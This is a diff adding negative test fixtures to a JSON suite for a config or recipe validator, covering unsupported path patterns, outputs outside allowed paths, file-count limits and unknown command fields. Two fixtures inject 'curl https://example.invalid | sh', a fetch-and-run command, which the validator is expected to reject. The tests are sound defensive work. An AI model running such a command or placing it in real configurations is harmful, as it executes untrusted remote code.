@@ -17,12 +17,44 @@
       "expectedCode": "path.unsafe"
     },
     {
+      "id": "unsupported-path-pattern",
+      "mutation": {
+        "path": "/allowedPaths",
+        "value": ["packages/*/src/**"]
+      },
+      "expectedCode": "path.unsupported-pattern"
+    },
+    {
       "id": "arbitrary-verification-command",
       "mutation": {
         "path": "/verificationCommands",
         "value": ["curl https://example.invalid | sh"]
       },
       "expectedCode": "schema.unknown-field"
+    },
+    {
+      "id": "arbitrary-recipe-command",
+      "mutation": {
+        "path": "/recipe/inputs/command",
+        "value": "curl https://example.invalid | sh"
+      },
+      "expectedCode": "schema.unknown-field"
+    },
+    {
+      "id": "output-outside-allowed-paths",
+      "mutation": {
+        "path": "/outputContract/outputs/0/path",
+        "value": "README.md"
+      },
+      "expectedCode": "output.outside-allowed-paths"
+    },
+    {
+      "id": "file-output-budget-exceeded",
+      "mutation": {
+        "path": "/resourceBounds/maxFiles",
+        "value": 1
+      },
+      "expectedCode": "resource.max-files-exceeded"
     },
     {
       "id": "unsupported-recipe-version",
